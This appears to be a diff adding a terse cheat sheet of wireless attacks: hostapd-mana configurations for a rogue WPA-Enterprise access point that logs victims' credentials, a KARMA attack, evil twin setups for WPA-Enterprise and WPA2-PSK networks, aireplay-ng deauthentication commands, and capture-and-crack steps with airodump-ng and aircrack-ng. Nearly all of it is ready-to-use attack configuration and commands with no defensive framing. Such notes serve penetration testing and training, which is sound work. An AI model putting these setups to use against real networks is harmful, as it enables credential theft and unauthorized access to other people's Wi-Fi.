@@ -1,0 +1,141 @@
+hostapd_mana [WPA ENTERPRISE] [same for all types]
+
+#mana.conf
+
+interface=wlan0
+ssid = <ssid1>
+hw_mode=g
+channel = 6
+driver=nl80211
+auth_algs=3
+wpa=3
+wpa_key_mgmt=WPA-EAP
+ieee8021x=1
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/root/certs/ca.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+dh_file=/root/certs/dhparam.pem
+man_wpe=1
+mana_eapsuccess=1
+mana_credout=hostapd.creds
+
+#hostapd.eap_user
+
+*     PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+
+
+
+KARMA ATTACK
+
+
+#mana.conf
+
+interface=wlan0
+ssid = <ssid1>
+hw_mode=g
+channel = 6
+driver=nl80211
+auth_algs=3
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise = TKIP CCMP
+ieee8021x=1
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/root/certs/ca.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+dh_file=/root/certs/dhparam.pem
+man_wpe=1
+mana_eapsuccess=1
+enable_mana=1
+mana_credout=hostapd.creds
+
+#hostapd.eap_user
+
+*     PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+
+EVIL TWIN [WPA ENTERPRISE]
+
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng --band abg wlan0
+airodump-ng -c <> wlan0
+
+#create an evil twin using hostapd
+
+interface=wlan0
+ssid = <ssid1>
+hw_mode=g
+channel = 6
+driver=nl80211
+auth_algs=3
+wpa=3
+wpa_key_mgmt=WPA-EAP
+ieee8021x=1
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/root/certs/ca.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+dh_file=/root/certs/dhparam.pem
+man_wpe=1
+mana_eapsuccess=1
+mana_credout=hostapd.creds
+
+#hostapd.eap_user
+
+*     PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+
+
+aireplay-ng --deauth 1 -a <ap bssid> -c <client bssid> wlan0
+
+
+EVIL TWIN [WPA2-PSK]
+
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng --band abg wlan0
+airodump-ng -c <>  wlan0
+
+#create an evil twin using hostapd
+ 
+interface=wlan0
+ssid = <ssid1>
+hw_mode=g
+channel = 6
+driver=nl80211
+auth_algs=1
+wpa=1
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+wpa_passphrase=pass
+
+aireplay-ng --deauth 1 -a <ap bssid> -c <client bssid> wlan0
+
+AP LESS CRACKING
+
+
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng --band abg wlan0
+airodump-ng -c <> -w test wlan0
+
+vim test.conf
+
+interface=wlan0
+hw_mode=g
+channel=1
+driver=nl80211
+ssid=<ssis>
+auth_algs=1
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=anything
+
+aircrack-ng -w <wordlist> test.cap
